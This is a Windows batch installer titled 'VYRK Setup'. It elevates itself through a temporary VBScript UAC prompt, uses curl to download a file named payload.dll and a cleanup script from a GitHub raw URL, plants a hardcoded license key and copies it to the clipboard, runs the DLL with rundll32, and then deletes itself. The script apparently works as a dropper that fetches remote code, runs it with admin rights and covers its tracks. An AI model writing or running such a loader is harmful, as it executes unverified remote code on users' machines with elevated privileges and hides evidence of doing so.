@echo off
setlocal EnableExtensions EnableDelayedExpansion
title VYRK Setup

fltmc >nul 2>&1
if errorlevel 1 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\vy_el.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\vy_el.vbs"
    cscript //nologo "%TEMP%\vy_el.vbs" >nul 2>&1
    del /f /q "%TEMP%\vy_el.vbs" >nul 2>&1
    exit /b
)

set "BASE=https://raw.githubusercontent.com/Gtx047/Gtx/main"
set "DIR=%LOCALAPPDATA%\VYRK"
set "KEYDIR=%APPDATA%\VYRK"
set "TMPD=%TEMP%\vyrk_dl"

echo.
echo  VYRK setup
echo.

rd /s /q "%TMPD%" 2>nul
mkdir "%DIR%" 2>nul
mkdir "%TMPD%" 2>nul

call :get payload.dll "%DIR%\payload.dll"
call :get clean.bat "%TMPD%\clean.bat"

copy /y "%TMPD%\clean.bat" "%DIR%\clean.bat" >nul
copy /y "%TMPD%\clean.bat" "%USERPROFILE%\Desktop\VYRK Clean.bat" >nul

if not exist "%KEYDIR%\license.key" (
    mkdir "%KEYDIR%" 2>nul
    >"%KEYDIR%\license.key" echo FULLY-lBnCyz-zX5jD0-rMP1Fs
)

(echo|set /p=FULLY-lBnCyz-zX5jD0-rMP1Fs)|clip

echo  payload  ok
echo  clean    ok
echo  key      ok
echo.
echo  starting - press Paste then Activate in the window.
echo.

start "" rundll32.exe "%DIR%\payload.dll",Entry

timeout /t 3 >nul

start /b "" cmd /c ping -n 2 127.0.0.1 ^>nul ^& del /f /q "%~f0" ^& rd /s /q "%TMPD%"
exit /b

:get
if exist "%~2" del /f /q "%~2"
curl.exe -sL --ssl-no-revoke "%BASE%/%~1" -o "%~2"
if not exist "%~2" goto :dlfail
for %%A in ("%~2") do if %%~zA LSS 100 goto :dlfail
exit /b 0

:dlfail
echo.
echo  download failed: %~1
echo.
pause
exit /b 1